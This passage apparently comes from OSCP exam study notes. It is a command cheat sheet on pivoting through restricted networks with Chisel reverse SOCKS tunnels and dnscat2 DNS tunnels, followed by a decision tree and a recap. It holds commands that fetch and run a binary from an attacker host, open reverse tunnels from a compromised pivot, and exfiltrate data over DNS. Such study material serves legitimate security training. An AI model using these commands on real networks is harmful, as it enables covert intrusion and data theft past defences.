# 2. Download + execute permission on pivot
wget <KALI_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# 3. Watch payload downloads
tail -f /var/log/apache2/access.log

# 4. Chisel reverse-tunnel server on Kali
chisel server --port 8080 --reverse

# 5. Chisel reverse SOCKS client on pivot
/tmp/chisel client <KALI_IP>:8080 R:socks > /dev/null 2>&1 &

# 6. Verify SOCKS listener
ss -ntplu
# Expect 127.0.0.1:1080

# 7. Inspect Chisel traffic
sudo tcpdump -nvvvXi tun0 tcp port 8080

# 8. SSH through Chisel SOCKS
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <USER>@<INTERNAL_IP>

# 9. Check DNS resolver
resolvectl status

# 10. Clear systemd-resolved cache
resolvectl flush-caches

# 11. Test attacker-controlled DNS name
nslookup test.<YOUR_DOMAIN>

# 12. Query TXT data
nslookup -type=txt <NAME>.<YOUR_DOMAIN>

# 13. Observe DNS tunnel traffic
sudo tcpdump -i <IFACE> udp port 53

# 14. Start dnscat2 authoritative server
dnscat2-server <YOUR_DOMAIN>

# 15. Start dnscat client through normal DNS
./dnscat <YOUR_DOMAIN>

# 16. dnscat direct-DNS mode (when UDP/53 can reach server directly)
./dnscat --dns server=<DNS_SERVER_IP>,port=53 --secret=<SECRET>

# 17. List / enter dnscat2 sessions
dnscat2> windows
dnscat2> window -i <ID>

# 18. dnscat2 local forward through compromised client
command (...) > listen 127.0.0.1:<LOCAL_PORT> <INTERNAL_IP>:<REMOTE_PORT>

# 19. Example: SMB forward
command (...) > listen 127.0.0.1:4455 172.16.2.11:445

# 20. Test SMB through local forwarded port
smbclient -p 4455 -L //127.0.0.1 -U <USER> --password=<PASSWORD>
```

## Fast decision tree

```text
Need to pivot?
  |
  +-- Is SSH transport allowed? ------------------> Use SSH tunneling/forwarding first.
  |
  +-- SSH blocked, but HTTP allowed? -------------> Chisel HTTP/WebSocket tunnel.
  |
  +-- Direct egress blocked, but DNS works? ------> dnscat2 DNS tunnel.
  |
  +-- Tunnel established? ------------------------> Verify listener, then enumerate internal services.
```

## Memorize these ideas, not sample IP addresses

1. **Chisel:** server on Kali with `--reverse`; client on pivot with `R:socks`; SOCKS appears on Kali, normally `127.0.0.1:1080`.
2. **SSH through SOCKS:** use `ProxyCommand` + `ncat` + `%h %p`.
3. **DNS exfiltration:** data can be encoded in subdomain labels.
4. **DNS infiltration:** arbitrary data can come back in records such as TXT.
5. **dnscat2:** server on authoritative DNS side; client on compromised internal host.
6. **dnscat2 `listen`:** conceptually similar to `ssh -L`.
7. **Verify everything:** `ss`, `tcpdump`, logs, DNS test queries, then test the actual destination service.
8. **Expect DNS tunneling to be slow and noisy.**

---

# One-page conceptual recap

```text
Problem:
DPI blocks your normal tunnel transport.

HTTP path:
Kali tool -> SOCKS 1080 -> Chisel server -> HTTP/WebSocket -> Chisel client on pivot -> internal target

DNS path:
Kali/authoritative DNS server -> DNS responses -> recursive resolver -> compromised client
compromised client -> DNS queries -> recursive resolver -> authoritative DNS server

Why it matters:
The tunnel rides inside a protocol the restricted network still permits.

OSCP takeaway:
Do not stop at “the internal host is unreachable.”
Enumerate egress, choose an allowed carrier, build a tunnel, verify the route, then continue normal enumeration/exploitation through the new path.
```

